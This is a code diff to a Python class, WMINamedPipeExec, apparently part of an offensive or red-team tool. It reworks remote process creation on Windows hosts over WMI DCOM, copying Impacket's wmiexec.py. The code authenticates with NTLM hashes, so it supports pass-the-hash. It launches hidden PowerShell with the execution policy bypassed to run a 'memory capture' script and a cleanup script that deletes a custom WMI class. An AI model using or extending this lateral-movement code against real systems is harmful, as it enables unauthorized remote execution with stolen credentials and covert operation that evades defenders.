@@ -218,8 +218,8 @@ class WMINamedPipeExec:
         print_verbose(f"Full command for WMI named pipe: {full_command}")
 
         try:
-            # Execute via WMI DCOM
-            process_id = self._create_wmi_process_dcom(full_command)
+            # Execute via traditional WMI DCOM
+            process_id = self._create_wmi_process_traditional(full_command)
             
             if process_id:
                 print_verbose(f"Process created via WMI named pipe with PID: {process_id}")
@@ -323,31 +323,33 @@ class WMINamedPipeExec:
                 'output': None
             }
 
-    def _create_wmi_process_dcom(self, command):
+    def _create_wmi_process_traditional(self, command):
         """
-        Create process via WMI Win32_Process.Create using DCOM connection
-        
-        This implementation uses the proper DCOM approach as shown in Impacket's wmiexec.py
+        Create process via traditional WMI using Impacket's approach
+        Based on the standard impacket wmiexec.py implementation
         """
-        print_debug("WMI process creation via DCOM")
+        print_debug("WMI process creation via traditional DCOM")
         
         try:
-            # Extract NT hash if available
+            # Extract credentials properly
+            lm_hash = ''
             nt_hash = ''
             if hasattr(self, 'ntlm_hash') and self.ntlm_hash:
-                try:
-                    nt_hash = self.ntlm_hash.split(":")[1] if ':' in self.ntlm_hash else self.ntlm_hash
-                except:
-                    nt_hash = ''
+                if ':' in self.ntlm_hash:
+                    lm_hash = self.ntlm_hash.split(":")[0]
+                    nt_hash = self.ntlm_hash.split(":")[1]
+                else:
+                    nt_hash = self.ntlm_hash
             
-            # Create DCOM connection using existing credentials
             print_debug(f"Creating DCOM connection to {self.host}")
+            
+            # Create DCOM connection exactly like impacket wmiexec.py
             dcom = DCOMConnection(
                 self.host,
-                self.username, 
+                self.username,
                 getattr(self, 'password', ''),
                 getattr(self, 'domain', ''),
-                lmhash='',
+                lmhash=lm_hash,
                 nthash=nt_hash,
                 aesKey='',
                 oxidResolver=True,
@@ -355,31 +357,34 @@ class WMINamedPipeExec:
             )
             
             print_debug("Creating WMI interface")
-            # Create WMI interface
+            # Follow exact impacket pattern
             iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
             iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
             iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
+            iWbemLevel1Login.RemRelease()
             
             print_debug(f"Executing WMI command: {command}")
-            # Get Win32_Process object and create process
+            # Get Win32_Process class and call Create method
             win32Process, _ = iWbemServices.GetObject('Win32_Process')
             
-            # Create process with proper parameter handling for Impacket
-            # The Create method expects: CommandLine, CurrentDirectory, ProcessStartupInformation
-            result = win32Process.Create(command)
+            # Call Create method with command line only (like impacket does)
+            result = win32Process.Create(command, NULL, NULL)
             
-            # Cleanup DCOM connection
+            # Cleanup
             dcom.disconnect()
             
-            if result.ReturnValue == 0:
-                print_verbose(f"WMI DCOM process created with PID: {result.ProcessId}")
-                return result.ProcessId
+            # Check result
+            if hasattr(result, 'ReturnValue') and result.ReturnValue == 0:
+                process_id = result.ProcessId if hasattr(result, 'ProcessId') else None
+                print_verbose(f"WMI process created successfully with PID: {process_id}")
+                return process_id
             else:
-                print_debug(f"WMI DCOM process creation failed with return value: {result.ReturnValue}")
+                error_code = result.ReturnValue if hasattr(result, 'ReturnValue') else 'Unknown'
+                print_debug(f"WMI process creation failed with return value: {error_code}")
                 return None
             
         except Exception as e:
-            print_debug(f"WMI DCOM process creation failed: {e}")
+            print_debug(f"WMI traditional process creation failed: {e}")
             try:
                 dcom.disconnect()
             except:
@@ -463,10 +468,10 @@ class WMINamedPipeExec:
             }}
             '''
             
-            # Execute PowerShell script via DCOM
+            # Execute PowerShell script via traditional WMI DCOM
             # Use cmd.exe to avoid potential PowerShell encoding issues
             ps_command = f'cmd.exe /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps_script}"'
-            result = self._create_wmi_process_dcom(ps_command)
+            result = self._create_wmi_process_traditional(ps_command)
             
             if result:
                 print_verbose(f"Memory capture PowerShell executed with PID: {result}")
@@ -498,14 +503,24 @@ class WMINamedPipeExec:
         try:
             print_debug(f"Querying WMI class: {class_name}")
             
+            # Extract credentials properly
+            lm_hash = ''
+            nt_hash = ''
+            if hasattr(self, 'ntlm_hash') and self.ntlm_hash:
+                if ':' in self.ntlm_hash:
+                    lm_hash = self.ntlm_hash.split(":")[0]
+                    nt_hash = self.ntlm_hash.split(":")[1]
+                else:
+                    nt_hash = self.ntlm_hash
+            
             # Create WMI connection for querying
             dcom = DCOMConnection(
                 self.host,
                 self.username, 
                 getattr(self, 'password', ''),
                 getattr(self, 'domain', ''),
-                lmhash='',
-                nthash=self._get_nt_hash(),
+                lmhash=lm_hash,
+                nthash=nt_hash,
                 aesKey='',
                 oxidResolver=True,
                 doKerberos=getattr(self, 'use_kerberos', False)
@@ -515,6 +530,7 @@ class WMINamedPipeExec:
             iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
             iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
             iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
+            iWbemLevel1Login.RemRelease()
             
             # Query the custom class
             query = f"SELECT * FROM {class_name}"
@@ -561,9 +577,9 @@ class WMINamedPipeExec:
             }}
             '''
             
-            # Execute cleanup via DCOM
+            # Execute cleanup via traditional WMI DCOM
             ps_command = f'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "{cleanup_script}"'
-            self._create_wmi_process_dcom(ps_command)
+            self._create_wmi_process_traditional(ps_command)
             
             print_debug("WMI class cleanup completed")
             
